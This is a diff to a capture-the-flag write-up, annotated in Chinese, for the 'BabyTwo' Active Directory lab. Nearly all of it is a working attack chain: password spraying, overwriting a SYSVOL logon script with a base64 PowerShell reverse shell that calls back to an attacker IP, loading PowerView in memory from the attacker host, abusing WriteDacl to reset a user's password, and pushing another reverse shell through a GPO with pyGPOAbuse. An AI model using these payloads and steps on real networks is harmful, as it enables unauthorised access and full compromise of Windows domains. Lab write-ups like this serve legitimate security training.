@@ -1,4 +1,69 @@
 ## BabyTwo
+### 总结
+```
+[★]$ nxc smb baby2.vl -u 'guest' -p '' --shares
+[★]$ smbclient -U 'guest%' '//baby2.vl/homes' //名单
+[★]$ awk '{print $1}' users.txt | grep '\.' > tmp.txt && mv tmp.txt users.txt
+[★]$ nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+[★]$ nxc smb 10.129.234.72 -u Carl.Moore -p Carl.Moore --shares
+SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
+[★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL'
+smb: \baby2.vl\scripts\> get login.vbs
+
+//使用工具 revshells.com; 选择PowerShell #3(Base64);Base64 编码的 UTF-16LE PowerShell 脚本
+[★]$ vi login.vbs
+</SNIP>    
+    Set objNetwork = Nothing
+End Sub
+
+CreateObject("WScript.Shell").Run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA3ACIALAA5ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==", 0, True
+
+[★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL'
+Try "help" to get a list of possible commands.
+smb: \> cd \baby2.vl\scripts\
+smb: \baby2.vl\scripts\> del login.vbs
+smb: \baby2.vl\scripts\> put login.vbs
+
+//当用户登录域时，系统会自动执行：\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
+[★]$ nc -lvnp 9090
+PS C:\Windows\system32> cat ..\..\user.txt
+
+$ bloodhound
+//从 Windows 中滥用“写 DACL”访问控制列表:(WriteDacl 使用PowerView.ps1 )
+//Amelia Griffiths -> MemberOf -> LEGACY@BABY2.VL -> WriteDacl -> GPOADM@BABY2.VL,GPO-MANAGEMENT@BABY2.VL
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+[★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
+
+PS C:\Users\amelia.griffiths> iex (iwr -usebasicparsing http://10.10.14.27:8011/PowerView.ps1)
+PS C:\Users\amelia.griffiths> add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths" //Amelia → GenericAll → gpoadm
+PS C:\Users\amelia.griffiths> $cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force //我确认要用明文密码，强制执行（-AsPlainText -Force）
+PS C:\Users\amelia.griffiths> set-domainuserpassword gpoadm -accountpassword $cred //Set-DomainUserPassword 修改用户密码；-accountpassword 新密码
+
+[★]$ nxc smb 10.129.234.72 -u gpoadm -p 'Password123!'
+SMB         10.129.234.72   445    DC               [+] baby2.vl\gpoadm:Password123!
+
+// 通过组策略对象来滥用通用所有访问控制列表（GenericAll ACL），请使用 pyGPOAbuse。
+// GPOADM@BABY2.VL -> GenericAll -> 蓝色文档方块 2个
+// GPOADM@BABY2.VL -> Contains -> GPO-MANAGEMENT@BABY2.VL -> Contains -> BABY2.VL -> GPLink -> 蓝色文档方块(GPO Fine Path: \\BABY2.VL\SYSVOL\BABY2.VL\POLICIES\{31B2340-016D-11D2-945F-00C04FB984F9}
+https://github.com/Hackndo/pyGPOAbuse
+
+[~/pyGPOAbuse][★]$ python3 pygpoabuse.py baby2.vl/gpoadm:'Password123!' -command "Powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA3ACIALAA5ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -dc-ip 10.129.234.72 -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"
+SUCCESS:root:ScheduledTask TASK_60e9109b created!
+[+] ScheduledTask TASK_60e9109b created!
+//侦听nc
+PS C:\Users\amelia.griffiths> gpupdate
+```
+```
+ACL	含义
+GenericAll	完全控制对象
+WriteDacl	可以修改对象的 ACL
+GPLink	可以链接 GPO
+Contains	容器关系
+
+iwr= Invoke-WebRequest;从你的攻击机下载
+iex= Invoke-Expression;直接 在内存执行脚本
+```
 ``` 
 [★]$ ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.129.234.72 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 [★]$ nmap -p$ports -Pn -sC -sV 10.129.234.72
@@ -266,10 +331,7 @@ MapNetworkShare "\\dc.baby2.vl\apps", "V"
 MapNetworkShare "\\dc.baby2.vl\docs", "L"
 
 ```
-#### False = 不等待执行结束
-```
-CreateObject("WScript.Shell").Run "powershell -nop -w hidden -e <base64>", 0, False
-```
+#### False = 不等待执行结束 不行
 #### 删除 上传
 ```
 [★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL'
